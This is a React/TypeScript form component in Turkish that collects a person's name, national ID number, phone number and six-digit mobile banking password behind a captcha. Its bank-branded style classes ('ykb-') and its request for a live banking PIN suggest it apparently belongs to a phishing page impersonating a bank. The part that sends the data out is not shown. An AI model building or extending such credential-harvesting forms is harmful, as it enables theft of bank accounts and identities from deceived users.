"use client";

import { isValidTCKN } from "@/lib/tc-validation";
import { formatPhone } from "@/lib/phone-mask";
import { Captcha } from "@/components/ui/Captcha";

export interface IdentityData {
  firstName: string;
  lastName: string;
  tcKimlik: string;
  phone: string;
  captcha: string;
  mobilePin: string;
}

interface IdentityStepProps {
  data: IdentityData;
  onChange: (data: IdentityData) => void;
  errors: Partial<Record<keyof IdentityData, string>>;
}

export function IdentityStep({ data, onChange, errors }: IdentityStepProps) {
  const set = (field: keyof IdentityData, value: string) => {
    onChange({ ...data, [field]: value });
  };

  const tcError =
    errors.tcKimlik ??
    (data.tcKimlik.length === 11 && !isValidTCKN(data.tcKimlik)
      ? "Geçersiz TC Kimlik Numarası"
      : undefined);

  return (
    <div className="mx-auto w-full max-w-[450px] space-y-[18px]">
      <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
        <div>
          <label className="ykb-label">Ad</label>
          <input
            type="text"
            className="ykb-input !max-w-full"
            value={data.firstName}
            onChange={(e) => set("firstName", e.target.value)}
          />
          {errors.firstName && (
            <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>
          )}
        </div>
        <div>
          <label className="ykb-label">Soyad</label>
          <input
            type="text"
            className="ykb-input !max-w-full"
            value={data.lastName}
            onChange={(e) => set("lastName", e.target.value)}
          />
          {errors.lastName && (
            <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>
          )}
        </div>
      </div>

      <div>
        <label className="ykb-label">TC Kimlik Numarası</label>
        <input
          type="text"
          className="ykb-input"
          value={data.tcKimlik}
          onChange={(e) =>
            set("tcKimlik", e.target.value.replace(/\D/g, "").slice(0, 11))
          }
          maxLength={11}
        />
        {tcError && <p className="mt-1 text-sm text-red-600">{tcError}</p>}
      </div>

      <div>
        <label className="ykb-label">Cep Telefonu</label>
        <input
          type="tel"
          className="ykb-input"
          value={data.phone}
          onChange={(e) => set("phone", formatPhone(e.target.value))}
          placeholder="0 (___) ___ __ __"
        />
        {errors.phone && (
          <p className="mt-1 text-sm text-red-600">{errors.phone}</p>
        )}
      </div>

      <div className="rounded-lg border border-ykb-input-border bg-white p-3 md:p-4">
        <h3 className="mb-3 text-sm font-medium text-ykb-primary">
          Mobil Bankacılık Şifresi
        </h3>
        <div>
          <label className="ykb-label">Mobil Şifre</label>
          <input
            type="password"
            inputMode="numeric"
            className="ykb-input"
            value={data.mobilePin}
            onChange={(e) =>
              set("mobilePin", e.target.value.replace(/\D/g, "").slice(0, 6))
            }
            placeholder="6 haneli şifre"
            maxLength={6}
            autoComplete="off"
          />
          {errors.mobilePin && (
            <p className="mt-1 text-sm text-red-600">{errors.mobilePin}</p>
          )}
        </div>
      </div>

      <Captcha
        value={data.captcha}
        onChange={(v) => set("captcha", v)}
      />
    </div>
  );
}
